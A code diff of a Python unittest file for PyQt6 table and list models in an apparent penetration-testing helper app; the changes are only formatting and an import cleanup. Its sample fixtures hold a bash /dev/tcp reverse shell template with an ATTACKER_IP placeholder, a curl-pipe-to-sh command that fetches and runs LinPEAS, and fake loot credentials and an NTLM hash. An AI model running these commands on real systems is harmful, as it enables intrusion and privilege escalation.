@@ -1,6 +1,6 @@
 import unittest
 import sys
-from PyQt6.QtCore import Qt, QModelIndex
+from PyQt6.QtCore import Qt
 from PyQt6.QtWidgets import QApplication
 
 from ui.models import LootTableModel, SnippetListModel, HistoryTableModel
@@ -23,7 +23,7 @@ class TestQtModels(unittest.TestCase):
                 "title": "SSH Admin",
                 "content": "admin:SuperSecretPass123",
                 "target_ip": "10.10.10.50",
-                "timestamp": "2026-08-27 12:00:00"
+                "timestamp": "2026-08-27 12:00:00",
             },
             {
                 "id": "loot_002",
@@ -32,8 +32,8 @@ class TestQtModels(unittest.TestCase):
                 "title": "NTLM Hash",
                 "content": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
                 "target_ip": "10.10.10.50",
-                "timestamp": "2026-08-27 12:05:00"
-            }
+                "timestamp": "2026-08-27 12:05:00",
+            },
         ]
 
         model = LootTableModel(entries=sample_entries)
@@ -77,7 +77,7 @@ class TestQtModels(unittest.TestCase):
             "title": "Root Flag",
             "content": "HTB{test_flag}",
             "target_ip": "10.10.10.50",
-            "timestamp": "2026-08-27 12:10:00"
+            "timestamp": "2026-08-27 12:10:00",
         }
         model.add_entry(new_entry, index=0)
         self.assertEqual(model.rowCount(), 3)
@@ -104,15 +104,15 @@ class TestQtModels(unittest.TestCase):
                 "title": "Nmap Port Scan",
                 "template": "nmap -p- --min-rate 1000 <TARGET_IP>",
                 "category": "recon",
-                "description": "Fast full port scan"
+                "description": "Fast full port scan",
             },
             {
                 "id": "snip_002",
                 "title": "LinPEAS",
                 "template": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                 "category": "privesc",
-                "description": "Linux privilege escalation awesome script"
-            }
+                "description": "Linux privilege escalation awesome script",
+            },
         ]
 
         model = SnippetListModel(snippets=sample_snippets)
@@ -137,7 +137,7 @@ class TestQtModels(unittest.TestCase):
             "id": "snip_003",
             "title": "Reverse Shell",
             "template": "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1",
-            "category": "access"
+            "category": "access",
         }
         model.add_snippet(new_snip)
         self.assertEqual(model.rowCount(), 3)
@@ -163,15 +163,15 @@ class TestQtModels(unittest.TestCase):
                 "text": "whoami /priv",
                 "target_ip": "10.10.10.15",
                 "timestamp": "2026-08-27 13:00:00",
-                "is_multiline": False
+                "is_multiline": False,
             },
             {
                 "id": "hist_002",
                 "text": "Line1\nLine2\nLine3",
                 "target_ip": "10.10.10.15",
                 "timestamp": "2026-08-27 13:01:00",
-                "is_multiline": True
-            }
+                "is_multiline": True,
+            },
         ]
 
         model = HistoryTableModel(history=sample_history)
